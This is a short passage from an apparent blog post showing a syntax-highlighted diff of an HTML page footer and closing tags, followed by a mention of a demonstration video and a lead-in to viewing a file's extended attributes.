+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">p</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;copyright&#34;</span>&gt;© 2019 GitHub, Inc. All rights reserved.&lt;/<span style="color:#309;font-weight:bold">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">footer</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">html</span>&gt;
 </span></span></code></pre></div><p>I made a video showing the entire chain in action:</p>
 <!-- raw HTML omitted -->
 <p>To show the extended attributes of a file, run:</p>
